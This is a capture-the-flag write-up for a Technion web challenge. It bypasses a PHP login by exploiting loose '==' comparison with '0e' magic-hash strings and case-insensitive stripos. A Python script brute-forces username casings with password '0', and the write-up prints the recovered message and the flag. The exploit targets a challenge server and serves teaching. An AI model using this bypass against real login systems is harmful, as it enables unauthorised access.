# Finding Ducky - Part 2
Category: Web, 100 points

## Description

> You've found webby! and she posted reviews in the area linking to her blog, see if there's anything interesting in it


## Solution

The attached website ("Webby's Blog") contains some static data about Webby's travels around the world. We start with basic recon:

```console
┌──(user@kali)-[/media/sf_CTFs/technion/Finding_Ducky_-_Part_2]
└─$ curl https://webby.ctf.cs.technion.ac.il/robots.txt
User-agent: *
Allow: /
Disallow: /ducky/message.php
```

`robots.txt` reveals that the owners don't want search engines to crawl `/ducky/message.php`. We should check what that page contains:

```console
┌──(user@kali)-[/media/sf_CTFs/technion/Finding_Ducky_-_Part_2]
└─$ curl https://webby.ctf.cs.technion.ac.il/ducky/message.php

<!DOCTYPE html>
<style>
input {
  width: 20%;
}
</style>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>Webby The Debugging Duck's Blog </title>
        <link rel="icon" type="image/x-icon" href="../assets/favicon.ico" />
        <!-- Font Awesome icons (free version)-->
        <script src="https://use.fontawesome.com/releases/v5.15.4/js/all.js" crossorigin="anonymous"></script>
        <!-- Google fonts-->
        <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
        <!-- Core theme CSS (includes Bootstrap)-->
        <link href="../css/styles.css" rel="stylesheet" />
    </head>
    <body>
        <div class="container">
            <h1 class="display-4"><br>Ducky's Message<br/></h1>
            <p class="lead">My brother sent me a weird message and told me to upload it to the blog. but only allow access to the people who know the credentials.<br/>
            So, I implemented this unbreakable <a href="source.php">authentication system</a>. if you know the secret, enter it below.</p>
        </div>
        <br/>
        <div class="container">
        <form name="auth" action="message.php" class="form-inline" method="post">
          <div class="form-group mb-2">
              <input type="text" class="form-control" required name="name" id="name" placeholder="Name">
          </div>
          <div class="form-group mb-2">
            <input type="password" class="form-control" required name="password" id="password" placeholder="Password">
          </div>
          <button type="submit" class="btn btn-primary">Submit</button>
        </form>
            </div>
      </body>
```

This is a basic form with a username and password. The page also kindly points us to the source code:

```php
<?php include "secret.php"; ?>

<?php
if (isset ($_POST['name']) && isset ($_POST['password'])) {
    $username = $_POST['name'];
    $password = $_POST['password'];
    echo '<br/><div>';
    if (stripos('DuckyDebugDuck', $username) !== false && strlen('DuckyDebugDuck') == strlen($username)){
        if (substr (md5 ($secret . $username . $secret), 0, 5) == $password) {
        echo '<pre>';
        include '/message.txt';
        echo '</pre>';
        echo '<br/><pre>';
        echo $secret;
        echo '</pre>';
        } else {
        echo 'Permission denied';
        }
    } else {
        echo 'Permission denied';
    }
    echo '</div>';
}
?>
```

It looks like we need to bypass three conditions in order to view the secret. Obviously, we are able to pass the first two if we just send `DuckyDebugDuck` as the username. But then, we hit the third condition: `(substr (md5 ($secret . $username . $secret), 0, 5) == $password)`. How do we pass that without knowing the `$secret`?

Well, with PHP's [Type Juggling](https://www.php.net/manual/en/language.types.type-juggling.php) quirks, of course. The comparison between `substr (md5 ($secret . $username . $secret), 0, 5)` and `$password` is performed using PHP's *loose comparison* operator (`==`) which allows type conversions during the comparison. So, for example, in PHP the condition of `"7" == 7` is `true`, even though one is a string and the second is an integer. Taking that one step further, we can also say that:

```console
┌──(user@kali)-[/media/sf_CTFs/technion/Finding_Ducky_-_Part_2]
└─$ php -r 'echo "0e1234" == "0";'
1
```

That is, PHP considers a string which starts with `0e` and continues only with digits as an integer represented with its scientific notation, and converts it to a `0`. It does the same for the string `"0"`, making both sides of the comparison equal.

Now, since `md5` outputs a result which consists of characters `[0-9a-f]`, including `e` of course, and this result is later trimmed to contain just five characters, if we can generate enough inputs for the hash function we have a chance of `(1/16) * (1/16) * (10/16) * (10/16) * (10/16)` to generate an output of `0e` followed by three digits. How do we generate different inputs? Notice how the first condition uses `stripos` and not `strpos`, making it case insensitive. This means that we can try all case combinations, giving us `2**len("DuckyDebugDuck")` attempts.

```python
from pwn import *
import requests

URL = "https://webby.ctf.cs.technion.ac.il/ducky/message.php"

def all_casings(input_string):
    # https://stackoverflow.com/questions/6792803/
    if not input_string:
        yield ""
    else:
        first = input_string[:1]
        if first.lower() == first.upper():
            for sub_casing in all_casings(input_string[1:]):
                yield first + sub_casing
        else:
            for sub_casing in all_casings(input_string[1:]):
                yield first.lower() + sub_casing
                yield first.upper() + sub_casing


def login(username, password):
    r = requests.post(URL, data = {"name": username, "password": password})
    if "pre" in r.text:
        return r.text
    return None

with log.progress("Attempting to login") as p:
    for username in all_casings("DuckyDebugDuck"):
        p.status(f"Trying username {username}")
        res = login(username, "0")
        if res is not None:
            log.info(f"Found username: {username}")
            log.info("Result:\n" + res)
            break
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/technion/Finding_Ducky_-_Part_2]
└─$ python3 solve.py
[q] Attempting to login: Trying username DUCkydEbugduck
[*] Found username: DUCkydEbugduck
[*] Result:

    <!DOCTYPE html>
    <style>
    input {
      width: 20%;
    }
    </style>
    <html lang="en">
        <head>
            <meta charset="utf-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
            <meta name="description" content="" />
            <meta name="author" content="" />
            <title>Webby The Debugging Duck's Blog </title>
            <link rel="icon" type="image/x-icon" href="../assets/favicon.ico" />
            <!-- Font Awesome icons (free version)-->
            <script src="https://use.fontawesome.com/releases/v5.15.4/js/all.js" crossorigin="anonymous"></script>
            <!-- Google fonts-->
            <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
            <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
            <!-- Core theme CSS (includes Bootstrap)-->
            <link href="../css/styles.css" rel="stylesheet" />
        </head>
        <body>
            <div class="container">
                <h1 class="display-4"><br>Ducky's Message<br/></h1>
                <p class="lead">My brother sent me a weird message and told me to upload it to the blog. but only allow access to the people who know the credentials.<br/>
                So, I implemented this unbreakable <a href="source.php">authentication system</a>. if you know the secret, enter it below.</p>
            </div>
            <br/>
            <div class="container">
            <form name="auth" action="message.php" class="form-inline" method="post">
              <div class="form-group mb-2">
                  <input type="text" class="form-control" required name="name" id="name" placeholder="Name">
              </div>
              <div class="form-group mb-2">
                <input type="password" class="form-control" required name="password" id="password" placeholder="Password">
              </div>
              <button type="submit" class="btn btn-primary">Submit</button>
            </form>
          <br/><div><pre>Hey,
    As you might have figured out by now, someone is following me, I might even be kidnapped by now.
    I don't know by who or why yet, but I think it has something to do with my research.
    I can't give you any information because I think they're watching my traffic,
    But I can tell you this, I hid something in the new logo with the passphrase duck_in_the_code.
    They're not smart enough to figure it out, but I know you are.
    Hope to see you soon.

    DDD</pre><br/><pre>cstechnion{everyday_im_juggling}</pre></div>      </div>
          </body>
```

The flag: `cstechnion{everyday_im_juggling}`.